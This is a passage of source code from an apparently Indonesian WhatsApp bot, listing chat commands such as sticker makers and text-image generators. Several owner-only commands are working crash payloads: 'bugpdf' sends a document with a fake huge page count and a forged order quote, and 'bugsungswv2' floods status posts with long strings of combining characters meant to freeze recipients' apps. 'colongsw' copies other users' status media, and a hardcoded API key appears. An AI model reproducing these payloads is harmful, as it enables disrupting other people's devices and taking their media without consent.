                       }, {quoted:{key : {participant: '0@s.whatsapp.net' },message: {orderMessage: {itemCount: 999999999,status: 1,surface: 1,message: 'ʀᴀɴᴢ々ɢᴇᴍ',orderTitle: 'ʀᴀɴᴢ',sellerJid: '0@s.whatsapp.net'}}}})
                        kurzxd.relayWAMessage(res)
                        kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                        kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                        } 
                        break
                                      case 'bugpdf':
if (!kurz.key.fromMe && !isOwner) return
hm = fs.readFileSync('./src/kurzxd.pdf')
kurzxd.sendMessage(from, hm, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️️',
    orderTitle: 'bugpdf〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }, pageCount: 9999999,filename:`${ngazap(prefix)}.pdf`, mimetype: 'application/pdf',jpegThumbnail: image}) 
 break
case 'bugsungsw':
				  if (!kurz.key.fromMe && !isOwner) return reply('Lu siapa?')
					buffer = fs.readFileSync(`./src/logo.jpg`)
					kurzxd.sendMessage('status@broadcast', buffer, image, { thumbnail : virgam
					})
					setTimeout( () => {
					kurzxd.sendMessage('status@broadcast', `UWES`, MessageType.extendedText)
					reply('UWES')
					}, 3000)
					break
case 'bugsungswv2':
if (!kurz.key.fromMe && !isOwner) return
            res = `${spamvirtex}`
            imeg = fs.readFileSync('src/catalog3.jpg')
    kurzxd.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 kurzxd X' ,thumbnail: virgam})
 kurzxd.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 kurzxd X' ,thumbnail: virgamv2})
 kurzxd.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 kurzxd X' ,thumbnail: virgamv3})
 kurzxd.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 kurzxd X' ,thumbnail: virgam})
 kurzxd.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 kurzxd X' ,thumbnail: virgamv2})
 kurzxd.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 kurzxd X' ,thumbnail: virgamv3})
 reply('Sukses Mengirim BugSungSwV2 Ya Anjing')
 break
			  case 'hidetag':
			  if (!kurz.key.fromMe) return reply('Lu siapa')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await kurzxd.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: kurz
			}
			kurzxd.sendMessage(from, optionshidetag, text)
			break
			 case 'sticktag':
			 if (!kurz.key.fromMe) return reply('Lu siapa')
            if (!kurz.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !kurz.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
            file = await kurzxd.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await kurzxd.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: kurz
            }
            ini_buffer = fs.readFileSync(file)
            kurzxd.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
 case 'colongsw':
        if (!kurz.key.fromMe) return;
        if ((isMedia && !kurzxd.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(kurz).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : kurz
          owgi = await kurzxd.downloadAndSaveMediaMessage(ger);
          kurzxd.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses")
          fs.unlinkSync(owgi)
        } else if ((isMedia && !kurzxd.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(kurz).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : kurz
          owgi = await kurzxd.downloadAndSaveMediaMessage(ger);
          kurzxd.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses")
          fs.unlinkSync(owgi)
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
           case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':
					if ((isMedia && !kurz.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
						const media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								kurzxd.sendMessage(from, fs.readFileSync(ran), sticker, { quoted : kurz}) 
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && kurz.message.videoMessage.seconds < 11 || isQuotedVideo && kurz.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
						const media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Yah error dek`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								kurzxd.sendMessage(from, buff, sticker, {quoted: kurz})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
						const media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						reply(mess.wait)
						keyrmbg = 'J93DHS3AqHmXJQWm4XLv9iRY'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Yah error dek')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								buff = fs.readFileSync(ranw)
								kurzxd.sendMessage(from, buff, sticker, {quoted: kurz})
							})
						    })					
					} else {
						reply(`𝗸𝗶𝗿𝗶𝗺 𝗴𝗮𝗺𝗯𝗮𝗿 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 ${prefix}𝘀𝘁𝗶𝗰𝗸𝗲𝗿 𝗮𝘁𝗮𝘂 𝗿𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝗴𝗮𝗺𝗯𝗮𝗿`)
					}
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
					case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
					case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					kurzxd.sendMessage(from, buffer1, image, {quoted: kurz, caption: `${makell}\n\nDone`})
					break
					case 'nulis':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} kurzxd*`)
                   F = body.slice(7)
                   reply(`Sbntr`)
